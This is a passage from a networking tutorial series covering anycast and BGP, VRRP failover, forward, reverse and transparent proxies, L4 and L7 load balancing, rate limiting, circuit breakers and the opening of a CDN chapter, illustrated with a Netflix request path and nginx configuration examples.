**Anycast** is the practice of announcing the **exact same IP prefix from multiple geographic locations simultaneously via BGP**. BGP then routes each user to the nearest location.

Anycast is **not a separate protocol**. It is a strategy built entirely on top of BGP.

```
Normal Unicast (one IP → one location):
  52.38.36.82 exists only in Netflix US-East
  User in Tokyo → route to US-East → high latency → slow ✗

Anycast (one IP → many locations):
  52.38.36.82 announced via BGP from:
    POP in Tokyo      → peers with NTT Japan (2 AS hops from Tokyo users)
    POP in Frankfurt  → peers with DE-CIX (2 AS hops from Germany users)
    POP in Ashburn    → peers with Equinix (1 AS hop from East Coast users)
    POP in São Paulo  → peers with PTT-SP  (2 AS hops from Brazil users)

  User in Tokyo:
    BGP routing table: 52.38.36.82 → Tokyo POP (2 hops) ← BEST
                                   → Frankfurt (18 hops)
                                   → Ashburn   (14 hops)
    → Traffic goes to Tokyo POP ✓

  User in Frankfurt:
    BGP routing table: 52.38.36.82 → Frankfurt (2 hops) ← BEST
                                   → Ashburn   (8 hops)
                                   → Tokyo     (22 hops)
    → Traffic goes to Frankfurt POP ✓

  Same IP, different physical servers, BGP decides who answers.
```

#### Anycast Failover

```
Tokyo POP goes down (hardware failure, DDoS, maintenance):

  1. Netflix stops announcing 52.38.36.82 from Tokyo via BGP
     (BGP WITHDRAW message sent to all peers)

  2. Peer routers remove the Tokyo route from their tables

  3. BGP reconverges (~30–60 seconds globally)

  4. Tokyo users' BGP routing tables now show:
     52.38.36.82 → Osaka POP (next nearest, 4 hops)

  5. New connections go to Osaka POP ✓
     Existing connections (TCP) break — clients reconnect

  No DNS change needed. No client configuration change.
  Automatic, protocol-level failover.
```

#### BGP vs Anycast — The Relationship

```
BGP        = the mechanism (routing protocol that carries prefix announcements)
Anycast    = the strategy  (announce same prefix from many places)

BGP alone  → one prefix, one location (normal internet routing)
Anycast    → impossible without BGP (nothing to advertise the routes)
Anycast+BGP → same prefix from many locations, BGP routes to nearest
```

#### DNS Anycast vs HTTP Anycast

- **DNS Anycast**: `8.8.8.8` (Google DNS) is anycast — your query goes to the nearest Google DNS POP. Safe because DNS queries are stateless (UDP).

- **HTTP Anycast**: Trickier because TCP is stateful. If BGP reroutes mid-connection (e.g., POP fails), the TCP connection breaks. But new connections automatically go to the new nearest POP.

---

### VRRP — Virtual Router Redundancy Protocol

#### The Problem VRRP Solves

Inside a datacenter, servers use a **default gateway** (usually the Top-of-Rack switch or a router) to send traffic out. If that gateway fails, all servers behind it lose connectivity — even if the internet is fine.

VRRP solves this with **router redundancy**: multiple physical routers share a single virtual IP address. If the master fails, a backup immediately takes over the VIP.

#### How VRRP Works

```
                    VIP: 10.0.0.1 (the default gateway all servers use)
                              │
              ┌───────────────┼───────────────┐
              │               │               │
        [Router A]      [Router B]      [Router C]
        MASTER ✓         BACKUP          BACKUP
        priority=150     priority=100    priority=50
        Owns VIP         Monitors A      Monitors A
              │
         [All servers use 10.0.0.1 as their default gateway]
```

**VRRP heartbeats:** The master sends **VRRP advertisement multicast packets** (224.0.0.18) every 1 second to the backup routers.

**Failover sequence:**
```
Router A (master) crashes:

  1. Router B and C stop receiving VRRP advertisements (wait 3 × interval = 3s)

  2. VRRP election: highest priority router becomes new master
     Router B wins (priority=100 > Router C priority=50)

  3. Router B sends GRATUITOUS ARP:
     "I am 10.0.0.1. My MAC is BB:BB:BB:BB:BB:BB"
     (Updates ARP caches on all local devices — they now send to Router B)

  4. Router B starts sending VRRP advertisements

  5. All servers behind 10.0.0.1 continue sending traffic — to Router B now ✓
     Failover complete in ~3 seconds (configurable)
```

#### VRRP vs VIP vs Anycast — Three Nested Layers

```
Level 1: GLOBAL (Anycast + BGP)
  Same prefix announced from multiple continents.
  BGP routes users to the right continent/POP.
  Failover: 30–60 seconds (BGP convergence)

Level 2: DATACENTER (VRRP)
  Multiple physical routers share a VIP inside one POP.
  VRRP routes traffic to the healthy router.
  Failover: 1–3 seconds (VRRP convergence)

Level 3: SERVER CLUSTER (Load Balancer / D-NAT)
  Multiple backend servers share a VIP via D-NAT.
  Load balancer routes requests to healthy servers.
  Failover: milliseconds (health check based)
```

These three layers work together. In a well-designed deployment, they route
users toward an appropriate region, edge/router, and backend — with redundancy
at each level.

---

### Putting It All Together — Your Netflix Request

```
You request 52.38.36.82 (Netflix VIP):

1. Your router: S-NAT
   192.168.1.105:54321 → 203.0.113.45:54321

2. Your ISP's router: BGP routing table
   52.38.36.82 matches 52.38.0.0/19 → forward to Netflix AS2906

3. Netflix border router: BGP (Anycast)
   Multiple POPs announced this prefix.
   Nearest POP (e.g., Los Angeles) wins.
   Packet enters Netflix's LA POP.

4. VRRP at LA POP:
   VIP 52.38.36.82 is held by ToR Switch A (VRRP Master).
   Packet forwarded correctly.

5. Netflix L4 Load Balancer: D-NAT
   52.38.36.82:443 → 10.0.4.55:443 (real backend server)

6. Backend processes request, returns response.

7. Response travels back:
   D-NAT reversed: 10.0.4.55 → 52.38.36.82
   BGP routes back to your ISP
   S-NAT reversed at your router: 203.0.113.45 → 192.168.1.105
   Browser receives response.
```

---

### Across the series

- **Routing protocols in depth:** OSPF, BGP (with real looking-glass
  exercises), and VRRP in the [TCP/IP guide's Part 12](../networking/tcp-ip/real-life-guide-v1.md#part-12-how-routers-learn-routes).
- **NAT made visible:** the `whoami` Go lab and the hand-built NAT with
  `conntrack` output in [TCP/IP guide, Chapter 52](../networking/tcp-ip/real-life-guide-v1.md#chapter-52-host-networking-internals-namespaces-veth-bridges-conntrack).
- **IP planning and overlapping CIDRs:** [TCP/IP guide, Chapter 61](../networking/tcp-ip/real-life-guide-v1.md#chapter-61-network-design-refactoring-migrations-diagrams-ipam-change-safety).

### Key Takeaways

- **S-NAT** (your home router): Private IP → Public IP for outbound traffic.
- **D-NAT** (Netflix load balancer): Public VIP → Private backend for inbound traffic.
- **VIP** is a floating IP — not tied to any physical server. Enables transparent failover.
- **BGP** is the internet's routing protocol — how routers know where every IP prefix lives.
- **Anycast** = same IP prefix announced from multiple locations via BGP. Nearest POP wins. Not a separate protocol — a BGP strategy.
- **VRRP** provides router redundancy inside a datacenter. Master/Backup hold a VIP. Failover in ~3 seconds.
- These three work in nested layers: BGP/Anycast (global) → VRRP (datacenter) → Load Balancer (server cluster).

---

# Part 5 — The infrastructure in between

Your request doesn't go straight from you to a single application server —
several purpose-built systems sit in the middle. This part covers three of
them: proxies (who's the middleman, and who do they actually work for),
load balancers (how one address becomes many servers), and CDNs (why "many
servers" should also mean "many places").

## Chapter 8 — Proxies: The Middlemen

> A proxy is any system that sits between a client and a server, forwarding requests on behalf of one to the other. The key question is: who does the proxy work for?

---

### The Simple Version (5-year-old)

Imagine you're in class and want to pass a note to a friend across the room.

- **Forward proxy**: You give the note to a friend sitting between you — they pass it for you. The teacher (Netflix) doesn't know who originally wrote the note — they think it's from your friend.

- **Reverse proxy**: Netflix has a receptionist at the front desk. All your notes go to the receptionist. They decide which Netflix employee should read it and handle your request. You don't know who actually answered — you just know it came from "Netflix."

- **Transparent proxy**: Your teacher secretly reads all notes without anyone knowing. You didn't set anything up — they just intercept.

---

### Forward Proxy

A **forward proxy** sits in front of **clients**. It makes requests to the internet on the client's behalf.

```
[Your Browser]
      │
      │  Configured to use proxy: proxy.company.com:3128
      ▼
[Forward Proxy Server]  ← client knows about this and uses it intentionally
      │
      │  Makes request as if it is the client
      ▼
[Internet] → [Netflix]

Netflix sees the request coming FROM the proxy's IP — not your IP.
```

#### Who Uses Forward Proxies

**Corporate networks:**
```
All employees → Corporate forward proxy → Internet
Proxy enforces:
  • Block social media (facebook.com → 403)
  • Log all URLs visited
  • Cache popular websites (save bandwidth)
  • Decrypt HTTPS (SSL inspection — controversial)
  • Enforce content policies
```

**Privacy / VPN:**
```
You → VPN server (acts as forward proxy) → Netflix
Netflix sees VPN server's IP, not your real IP.
Your ISP sees encrypted traffic to VPN, not which sites you visit.
```

**Scraping / Automation:**
```
Scraper → Pool of forward proxies → Target website
Rotates IPs so the target doesn't rate-limit one source.
```

#### How the Browser Uses a Forward Proxy

There are two ways:

**1. HTTP CONNECT method (tunneling — for HTTPS):**
```
Browser → Proxy: CONNECT www.netflix.com:443 HTTP/1.1
Proxy → Netflix: Opens TCP connection to netflix.com:443
Proxy → Browser: 200 Connection Established

Now the proxy passes bytes blindly in both directions.
The proxy cannot see inside the encrypted TLS tunnel.
Browser and Netflix speak TLS directly through the tunnel.
```

**2. HTTP proxy (for plain HTTP only — legacy):**
```
Browser → Proxy: GET http://example.com/ HTTP/1.1
                 Host: example.com
                 Proxy-Authorization: Basic ...
Proxy → example.com: GET / HTTP/1.1 (forwards the request)
example.com → Proxy: 200 OK [content]
Proxy → Browser: 200 OK [content]
```

#### SSL Inspection (HTTPS Interception)

Some corporate proxies perform a "man-in-the-middle" on HTTPS:

```
Browser → Proxy: CONNECT netflix.com:443
Proxy → Browser: 200 Established (but proxy doesn't connect to Netflix yet)
Browser → Proxy: TLS ClientHello
Proxy → Browser: TLS ServerHello + [fake netflix.com cert signed by corp CA]
                 (The corp CA cert is pre-installed in all company browsers)
Browser → Proxy: TLS established (trusted, because corp CA is trusted)

Proxy → Netflix: Opens real TLS connection to netflix.com
Netflix → Proxy: Real TLS session

Proxy sees decrypted content, can log/filter, then re-encrypts to Netflix.
```

This is legitimate inside corporations where employees consent, but it is a MITM attack when done without consent.

---

### Reverse Proxy

A **reverse proxy** sits in front of **servers**. Clients talk to the reverse proxy thinking it is the server.

```
[Your Browser]
      │
      │  Requests netflix.com (has no idea a proxy is involved)
      ▼
[Reverse Proxy — Nginx / Envoy / Cloudflare]
      │
      │  Forwards to appropriate backend (client never knows)
      ▼
[Backend Server 1]  or  [Backend Server 2]  or  [Backend Server 3]

You see responses from "nginx" — you never know 10.0.4.55 exists.
```

#### What Reverse Proxies Do

**TLS Termination:**
```
Client ──[HTTPS]──► Reverse Proxy ──[HTTP]──► Backend
The reverse proxy holds the TLS certificate and private key.
Backend servers don't need to handle TLS — simpler, lighter.
```

**Caching:**
```
First request for /static/logo.png:
  Proxy → Backend → gets logo → caches it → returns to client

Second request for /static/logo.png:
  Proxy → cache HIT → returns directly → backend not involved
  Latency: 1ms (from cache) instead of 20ms (from backend)
```

**Load Balancing:**
```
Round-robin distribution:
  Request 1 → Backend A
  Request 2 → Backend B
  Request 3 → Backend C
  Request 4 → Backend A
  ...

Reverse proxy health-checks backends.
Removes unhealthy backends from rotation automatically.
```

**Rate Limiting:**
```
limit_req_zone $binary_remote_addr zone=api:10m rate=100r/s;

location /api/ {
    limit_req zone=api burst=20 nodelay;
    proxy_pass http://backend;
}

→ Max 100 requests/second per IP.
  First 20 over that limit: allowed (burst).
  After burst: 429 Too Many Requests.
```

**Request/Response Modification:**
```
Add headers before forwarding to backend:
  X-Real-IP: 203.0.113.45        (client's real IP — otherwise backend sees proxy IP)
  X-Forwarded-For: 203.0.113.45  (standard header for proxied IPs)
  X-Forwarded-Proto: https       (original protocol — backend receives HTTP from proxy)

Remove sensitive headers from response:
  Server: nginx                   (don't expose Apache/version info)
  X-Powered-By: [removed]        (don't expose PHP/Express/etc)
```

**Compression:**
```
Backend returns uncompressed HTML (100KB).
Reverse proxy compresses to Brotli (30KB).
Client receives 70% smaller response.
Backend doesn't need to implement compression.
```

**A/B Testing / Canary Deployments:**
```
10% of requests → Backend v2 (new version — canary)
90% of requests → Backend v1 (stable)
Reverse proxy decides based on cookie, IP hash, or random.
```

#### Nginx as a Reverse Proxy — Config Example

```nginx
upstream netflix_backends {
    least_conn;                         # Load balancing algorithm
    server 10.0.4.51:8080 weight=5;    # Backend 1 (5x weight)
    server 10.0.4.52:8080 weight=5;    # Backend 2 (5x weight)
    server 10.0.4.53:8080 weight=1;    # Backend 3 (canary, 1x weight)
    keepalive 32;                       # Keep 32 connections warm
}

server {
    listen 443 ssl http2;
    server_name www.netflix.com;

    # TLS termination
    ssl_certificate     /etc/ssl/netflix.crt;
    ssl_certificate_key /etc/ssl/netflix.key;
    ssl_protocols       TLSv1.3;
    ssl_ciphers         TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256;

    # Security headers
    add_header Strict-Transport-Security "max-age=31536000" always;
    add_header X-Frame-Options "DENY" always;

    # Rate limiting
    limit_req zone=per_ip burst=50 nodelay;

    location / {
        proxy_pass http://netflix_backends;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;

        # Timeouts
        proxy_connect_timeout 5s;
        proxy_read_timeout    30s;

        # Caching for static assets
        location ~* \.(js|css|png|jpg|woff2)$ {
            proxy_cache static_cache;
            proxy_cache_valid 200 1d;
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
}
```

---

### Transparent Proxy

A **transparent proxy** intercepts traffic without the client knowing or being configured to use it. The client's browser is not configured with any proxy settings — yet all traffic goes through the proxy.

```
[Your Browser] → [Your Router] → [Transparent Proxy] → [Internet]
                       ↑
              Network-level interception
              All TCP port 80/443 traffic redirected to proxy
              Browser is unaware

Used by:
  • ISPs (caching, content filtering)
  • Coffee shop Wi-Fi (inject ads)
  • Government censorship firewalls
  • Corporate networks (no browser config required)
```

For HTTP: transparent proxy can read and modify traffic.
For HTTPS: transparent proxy can only see IP + SNI (hostname). Cannot decrypt without SSL interception.

---

### Service Mesh — Proxies Inside the Datacenter

In a microservices architecture, every service calls many other services. How do you handle:
- mTLS between services?
- Retries, timeouts, circuit breaking?
- Traffic routing for canary deployments?
- Distributed tracing?

A **service mesh** uses a **sidecar proxy** — a proxy deployed alongside every service instance.

```
Service A                Service B
┌────────────────┐      ┌────────────────┐
│ App (Port 8080)│      │ App (Port 8080)│
│                │      │                │
│ Envoy Proxy    │      │ Envoy Proxy    │
│ (sidecar)      │      │ (sidecar)      │
└───────┬────────┘      └────────┬───────┘
        │                        │
        └──── mTLS ─────────────►│
        All traffic between services goes through sidecars.
        The app doesn't know about mTLS, retries, or tracing — Envoy handles it.
```

Envoy is a common sidecar/data-plane proxy in service-mesh architectures.
Istio and Linkerd are popular service mesh frameworks.

---

### Proxy Headers — Knowing the Real Client IP

When a reverse proxy forwards your request to the backend, the backend sees the **proxy's IP** as the source, not your real IP. These headers convey the original client's IP:

```
X-Forwarded-For: 203.0.113.45, 10.0.0.1
                 ↑              ↑
          original client   intermediate proxy

X-Real-IP: 203.0.113.45
           ↑ The first (original) client IP

Forwarded: for=203.0.113.45;proto=https;by=10.0.0.1
           ↑ RFC 7239 standard (newer, single header)
```

**Security caveat:** `X-Forwarded-For` can be spoofed by clients. If a client sends `X-Forwarded-For: 1.2.3.4`, the backend sees `1.2.3.4, [proxy IP]`. For rate limiting and security decisions, only trust the **rightmost IP** (added by your own proxy) — not client-supplied values.

---

### Forward vs Reverse Proxy — Quick Comparison

| Aspect | Forward Proxy | Reverse Proxy |
|---|---|---|
| Serves | Client | Server |
| Client configured? | Yes (or transparent) | No — client unaware |
| Who knows about it? | Client | Server |
| Hides | Client's identity from servers | Server's identity from clients |
| Example | Corporate proxy, VPN | Nginx, Cloudflare, AWS ALB |
| TLS | Tunnels (CONNECT) or intercepts | Terminates TLS |
| Caching | Caches popular content (saves bandwidth) | Caches responses (reduces origin load) |
| Load balancing | No | Yes |

---

### Across the series

- **Build a reverse proxy in Go** that handles `X-Forwarded-For` correctly
  (and see the legacy API pass a spoofed client IP straight through):
  `revproxy` in [Chapter 20](#chapter-20-reverse-proxies-in-go-the-client-s-identity-framing-and-request-smuggling).
- **The PROXY protocol** (how L4 proxies pass the client address) with a Go
  parser: [TCP/IP guide, Chapter 57](../networking/tcp-ip/real-life-guide-v1.md#chapter-57-production-load-balancing-l4-vs-l7-health-checks-draining-retries).
- **Go plan:** a production reverse proxy ([Day 64](../Golang/detailed-90-day-plan/week9.md#day-64-http-reverse-proxy)) and an
  SNI router that routes TLS without decrypting it ([Day 55](../Golang/detailed-90-day-plan/week8.md#day-55-sni-routing)).

### Key Takeaways

- **Forward proxy** works for clients — makes requests on their behalf, hides client IP.
- **Reverse proxy** works for servers — receives client requests, forwards to backends, hides server topology.
- **Transparent proxy** intercepts without client configuration — used by ISPs, governments, corporate networks.
- Netflix's edge is a **reverse proxy** (Nginx/Envoy) — terminates TLS, caches, rate-limits, load balances.
- **CONNECT method** is how browsers tunnel HTTPS through a forward proxy.
- Reverse proxies add `X-Forwarded-For` so backends know the real client IP.
- **Service meshes** use sidecar proxies (Envoy) to handle cross-service mTLS, retries, and tracing transparently.

---

## Chapter 9 — Load Balancers & Rate Limiting

> Netflix has thousands of servers. A load balancer decides which server handles your request — and makes sure no single server gets overwhelmed. Rate limiting makes sure no single user overwhelms Netflix.

---

### The Simple Version (5-year-old)

Imagine a grocery store with 20 checkout lanes.

- A **load balancer** is the person at the entrance who says "Lane 3 is free, go there!" — so everyone doesn't pile into Lane 1.
- **Health checks** are like checking if a cashier is at the register before sending you there. If they're on break, you get sent to another lane.
- **Rate limiting** is like a rule: "Each customer can only buy 100 items. If you have more, come back later." This prevents one person from blocking everyone else.

---

### Why Load Balancers Exist

One server can handle perhaps 1,000 concurrent connections. Netflix has 200+ million subscribers. Solution: many servers, each handling a slice of traffic.

```
Without load balancer:
  All users → netflix.com:443 → 1 server → overloaded → down ✗

With load balancer:
  All users → netflix.com:443 → Load Balancer
                                  ├──► Server 1  (handles 1,000 users)
                                  ├──► Server 2  (handles 1,000 users)
                                  ├──► Server 3  (handles 1,000 users)
                                  └──► Server N  (handles 1,000 users)
  N servers → N × 1,000 concurrent users ✓
```

---

### L4 Load Balancer — Transport Layer

An **L4 load balancer** operates at the transport layer (TCP/UDP). In a
pass-through design, it sees IP addresses and ports but does not decrypt TLS or
read HTTP headers.

```
Client → L4 LB:443 → Backend:443 (TCP stream forwarded as-is)
             ↑
  L4 LB reads: SrcIP, DstIP, SrcPort, DstPort
  L4 LB does NOT read: HTTP method, URL, headers, cookies
```

#### How L4 Load Balancing Works

**Method 1: NAT (D-NAT)**
The load balancer rewrites the destination IP:
```
Packet: Dst=52.38.36.82:443  →  LB rewrites  →  Dst=10.0.4.55:443
Return: Src=10.0.4.55:443   →  LB rewrites  →  Src=52.38.36.82:443
LB is in the path of every packet.
```

**Method 2: Direct Server Return (DSR)**
The load balancer only handles the inbound SYN, then steps aside:
```
Client → LB (initial SYN)
LB → Backend (forwards connection, sets up rules)
Backend → Client DIRECTLY (response bypasses LB)
LB is only in the path of inbound packets. Outbound bypasses it.
Much faster for high-bandwidth responses (video!).
```

#### L4 Load Balancing Algorithms

**Round Robin:**
```
Request 1 → Server A
Request 2 → Server B
Request 3 → Server C
Request 4 → Server A  (cycles)
Simple. Ignores server load.
```

**Weighted Round Robin:**
```
Server A weight=5 → gets 5 requests per cycle
Server B weight=3 → gets 3 requests per cycle
Server C weight=2 → gets 2 requests per cycle
Use when servers have different capacity.
```

**Least Connections:**
```
Server A: 100 active connections
Server B: 50 active connections  ← WINNER (fewest)
Server C: 75 active connections
New request → Server B
Best for requests with variable processing time.
```

**IP Hash:**
```
Hash the client's source IP → maps to a backend while the pool is unchanged
hash(203.0.113.45) % 3 = 1 → Server B
Same client tends to hit the same server until the backend set or hash policy changes.
Breaks if a server is added or removed (consistent hashing fixes this).
```

**Consistent Hashing:**
```
Servers are placed on a "virtual ring" (hash ring).
Each request's key (IP, user ID) is hashed to a point on the ring.
Request goes to the nearest server clockwise on the ring.

Adding/removing a server only remaps a fraction of requests
(vs IP hash which remaps all requests).
Used by Netflix's Cassandra, Redis, and CDN caches.
```

#### L4 LB Examples
- **AWS NLB** (Network Load Balancer)
- **HAProxy** (in TCP mode)
- **Linux LVS** (IP Virtual Server) — used by Netflix
- **IPVS** (IP Virtual Server — kernel-level, extremely fast)

---

### L7 Load Balancer — Application Layer

An **L7 load balancer** operates at the application layer. It **decrypts TLS**, reads HTTP headers, URLs, cookies — and makes routing decisions based on content.

```
Client ──[HTTPS]──► L7 LB (TLS terminated here)
                       │  reads HTTP: method, path, headers, cookies
                       ├──► API servers  (if path starts with /api/)
                       ├──► Static servers  (if path ends with .js/.css)
                       ├──► Stream servers  (if path starts with /video/)
                       └──► Auth servers  (if path is /login)
```

#### What L7 LBs Can Do That L4 Cannot

| Capability | L4 | L7 |
|---|---|---|
| Route by URL path | No | Yes |
| Route by HTTP header | No | Yes |
| Route by cookie value | No | Yes |
| Sticky sessions (cookie-based) | No | Yes |
| TLS termination | No | Yes |
| HTTP → HTTPS redirect | No | Yes |
| Rate limiting (per user/endpoint) | No | Yes |
| WAF (Web Application Firewall) | No | Yes |
| A/B testing / canary | No | Yes |
| Response caching | No | Yes |
| Auth/token validation | No | Yes |
| Compression | No | Yes |
| Request body inspection | No | Yes |
| Retries / circuit breaker | No | Yes |

#### L7 Content-Based Routing

```
Incoming request: GET /api/v1/users/me
  → Rule: path starts with /api/ → route to API cluster

Incoming request: GET /static/app.abc123.js
  → Rule: path ends with .js → route to CDN / static servers

Incoming request: GET /browse
  → Rule: path is /browse → route to UI rendering cluster

Incoming request: GET /video/stream/12345
  → Rule: path starts with /video/ → route to streaming cluster
```

#### Sticky Sessions (Session Affinity)

Some applications store session state on the server. Those systems may require
the same user to keep reaching the same server, or they need the session state
moved to shared storage.

```
Method 1: Cookie-based (L7 only)
  First request → Server A → LB sets cookie: SERVERID=A
  Next requests → LB reads cookie → routes to Server A

Method 2: IP-hash (L4 or L7)
  Same client IP → same server (best-effort)
  Breaks if server fails or client changes IP

Best practice: Use distributed session stores (Redis) instead.
  Every server can serve any user — no stickiness needed.
```

#### L7 LB Examples
- **Nginx** (web server + reverse proxy + L7 LB)
- **Envoy Proxy**
- **AWS ALB** (Application Load Balancer)
- **HAProxy** (in HTTP mode)
- **Netflix Zuul** (their own JVM-based L7 gateway)

---

### Health Checks — Removing Dead Servers

The load balancer continuously checks if each backend is healthy. Unhealthy backends are removed from rotation until they recover.

#### Types of Health Checks

**TCP Health Check (L4):**
```
LB → Tries to open TCP connection to Backend:8080
Connection SUCCESS → healthy ✓
Connection REFUSED/TIMEOUT → unhealthy ✗
Doesn't verify the app is actually working — just that the port is open.
```

**HTTP Health Check (L7):**
```
LB → GET /health HTTP/1.1 Host: backend
Backend → 200 OK {"status": "healthy", "db": "ok", "cache": "ok"}
LB checks: response code == 200? body contains "healthy"? ✓

If backend returns 500 or times out → marked unhealthy → removed from pool
```

**Deep Health Check:**
```
GET /health/deep
Backend checks all dependencies:
  - Database connection: OK
  - Redis cache: OK
  - Downstream services: OK
Returns 200 only if everything is working.
Prevents routing to a server that is "up" but functionally broken.
```

#### Health Check Configuration

```
Healthy threshold:    2 consecutive successes → mark healthy
Unhealthy threshold:  3 consecutive failures  → mark unhealthy
Check interval:       5 seconds
Check timeout:        2 seconds

Timeline:
  t=0:   Backend healthy, serving traffic
  t=10:  Backend fails (disk full)
  t=15:  Health check 1: FAIL
  t=20:  Health check 2: FAIL
  t=25:  Health check 3: FAIL → marked UNHEALTHY → removed from LB pool
  t=30:  No more traffic sent to this backend ✓

  t=60:  Disk cleared, backend recovers
  t=65:  Health check 1: SUCCESS
  t=70:  Health check 2: SUCCESS → marked HEALTHY → added back to LB pool ✓
```

---

### Rate Limiting

Rate limiting controls how many requests a client can make in a given time period. Prevents:
- Abuse (credential stuffing, scraping)
- Accidental DDoS from buggy clients
- One user consuming all resources (noisy neighbor)

#### Rate Limiting Algorithms

**Token Bucket:**
```
A bucket holds tokens. Each token = permission to make 1 request.
Bucket refills at a steady rate. Bucket has a max capacity (burst).

Capacity: 100 tokens
Refill rate: 10 tokens/second

At 10 req/s: steady state — bucket stays full, requests allowed
At 50 req/s: burning through 40 tokens/s, bucket empties in 2.5s → throttled
At 1 req/s:  tokens accumulate, can burst later

Allows SHORT BURSTS above the sustained rate.
```

**Leaky Bucket:**
```
Requests go IN to a bucket.
Bucket drains (processes) at a fixed rate.
If bucket FULL → reject new requests.

Rate: 100 req/s exactly.
Smooth, predictable output rate.
No bursting allowed.
Good for protecting backend capacity.
```

**Sliding Window Counter:**
```
Track requests in the last N seconds.
Count requests in [now - N, now].
If count >= limit → reject.

More accurate than fixed windows (which can allow 2x the limit at window boundaries).
```

**Fixed Window Counter:**
```
Count requests in the current window (e.g., this minute).
If count >= limit in this window → reject.
Reset at next window boundary.

Simple but can be gamed: 100 req at 12:00:59, 100 req at 12:01:00 = 200 req/s burst.
```

#### Rate Limiting Layers at Netflix

```
Layer 1: L3/L4 — Packet-level (iptables / eBPF)
  Rule: DROP if source IP sends > 100,000 packets/sec
  Purpose: DDoS mitigation — stop volumetric attacks before they hit the app
  Speed: Line rate (millions of packets/sec evaluated)

Layer 2: L7 — Request-level (Nginx / Envoy)
  Rule: 100 requests/second per IP on /api/login
  Rule: 1,000 requests/minute per authenticated user
  Purpose: Prevent credential stuffing, scraping, API abuse
  Response: HTTP 429 Too Many Requests
  Headers: Retry-After: 30  (try again in 30 seconds)

Layer 3: Application — Business logic
  Rule: Max 5 concurrent streams per account
  Rule: Max 3 failed login attempts → CAPTCHA
  Rule: Max 1 password reset email per hour
  Purpose: Enforce service limits, prevent account abuse
```

#### Distributed Rate Limiting

A single server can rate-limit locally. But if you have 100 servers and a client hits a different one each request, each server sees only 1% of the traffic — local rate limiting fails.

**Solution: Shared state via Redis:**
```
Each Nginx server:
  On request → INCR user:12345:requests in Redis (atomic)
  Check: if count > 1000 → return 429
  TTL on key: 60 seconds (sliding window)

All servers share the same counter → correct rate limiting regardless of which server handles the request.
```

---

### Circuit Breaker — Failing Fast

A circuit breaker prevents cascading failures when a backend service is struggling.

```
CLOSED state (normal):
  Requests flow to backend.
  If error rate > 50% in last 10s → trip to OPEN.

OPEN state (backend is failing):
  Requests immediately return error (503) without hitting backend.
  Backend gets time to recover.
  After 30s → move to HALF-OPEN.

HALF-OPEN state (testing recovery):
  Let 1 request through.
  SUCCESS → return to CLOSED.
  FAILURE → return to OPEN (wait another 30s).

Why this helps:
  Without circuit breaker: All requests pile up waiting for slow backend.
  With circuit breaker: Fail fast → caller can retry elsewhere or return cached data.
  Backend isn't bombarded with traffic while it's struggling → recovers faster.
```

---

### Across the series

- **Health checks, draining, and retries, measured:** `lbdrain` in
  [TCP/IP guide, Chapter 57](../networking/tcp-ip/real-life-guide-v1.md#chapter-57-production-load-balancing-l4-vs-l7-health-checks-draining-retries). A graceful backend
  shutdown gave 300/300 successful requests; `kill -9` gave 24 errors.
- **Rate limiting, retry budgets, idempotency keys, and circuit breakers** in
  one Go program: `resilience`, [Chapter 21](#chapter-21-resilience-between-services-rate-limits-retries-idempotency-and-circuit-breakers).
- **Go plan:** four load-balancing algorithms ([Day 45](../Golang/detailed-90-day-plan/week7.md#day-45-load-balancing-algorithms)), a
  complete L4 load balancer ([Day 48](../Golang/detailed-90-day-plan/week7.md#day-48-tcp-load-balancer-l4)), L7 rate limiting
  ([Day 76](../Golang/detailed-90-day-plan/week11.md#day-76-rate-limiting-at-l7)), and all five rate-limiting algorithms compared
  ([Day 92](../Golang/detailed-90-day-plan/week13.md#day-92-rate-limiting-algorithms-deep-dive)).

### Key Takeaways

- **L4 load balancers** route TCP/UDP streams by IP+port. Fast, cannot inspect content. DSR handles high-bandwidth responses efficiently.
- **L7 load balancers** terminate TLS, read HTTP, route by URL/headers/cookies. Feature-rich, slightly more overhead.
- **Health checks** continuously verify backends. Unhealthy servers are removed within seconds.
- Rate limiting algorithms: **Token bucket** (allows bursts), **leaky bucket** (strict rate), **sliding window** (accurate).
- Netflix rate limits at three layers: packet-level (L3/L4), request-level (L7), and business-logic (application).
- **Distributed rate limiting** requires shared state (Redis) — local counters fail when traffic is spread across many servers.
- **Circuit breakers** prevent cascading failures by failing fast when a backend is struggling.

---

## Chapter 10 — CDN: Content Near You

> A CDN (Content Delivery Network) stores copies of content in many locations
> around the world so many users can fetch it from a nearby edge — fast.

---

### The Simple Version (5-year-old)

Imagine Netflix has one giant warehouse in Los Angeles. Every time someone in Mumbai wants to watch a movie, they'd have to wait for the movie to travel from LA to Mumbai — that's far and slow!

Instead, Netflix builds **small local warehouses** in Mumbai, London, Tokyo, and São Paulo. Each warehouse stores the most popular movies. When someone in Mumbai wants to watch, the movie comes from the Mumbai warehouse — much faster!

That is a CDN. Your content comes from a nearby "warehouse" instead of from far away.

---

### Why CDNs Exist

Two problems CDNs solve:

**Latency:** Light travels through fiber at ~200,000 km/s. A packet from Mumbai to Los Angeles (14,000 km round trip) takes at minimum 70ms just at the speed of light — plus routing overhead (~150ms in practice). A packet from Mumbai to a Mumbai server: ~1ms.

**Origin load:** Netflix has 200M subscribers. If every video request hit Netflix's origin servers in Los Angeles, the bandwidth and compute cost would be astronomical. CDN edge servers handle 95%+ of Netflix video traffic — origin servers only handle the small percentage of cache misses.

```
Without CDN:
  User in Mumbai → Netflix servers in LA → 150ms latency
  All 200M users → Netflix LA → overloaded

With CDN:
  User in Mumbai → CDN server in Mumbai → 1ms latency
  CDN serves 95% of requests → origin barely touched
```

---

### How a CDN Works

#### Cache Hit — The Fast Path

```
User in Tokyo requests: GET /static/app.abc123.js

1. Request arrives at CDN edge POP in Tokyo.
2. Edge server checks its cache: FOUND ✓ (cache HIT)
3. Edge server returns cached response immediately.
4. Origin server is never contacted.

Latency: ~5ms (Tokyo user to Tokyo edge)
```

#### Cache Miss — The Slow Path (happens once per resource per POP)

```
User in Tokyo requests: GET /video/12345/chunk001.mp4  (not yet cached)

1. Request arrives at CDN edge POP in Tokyo.
2. Edge checks cache: NOT FOUND (cache MISS)
3. Edge makes request to Netflix origin servers (LA):
   Edge (Tokyo) → Origin (LA) → 150ms round trip
4. Origin returns the video chunk.
5. Edge caches it locally (stored on Tokyo edge SSD).
6. Edge returns response to user.

All subsequent users in Tokyo requesting the same chunk:
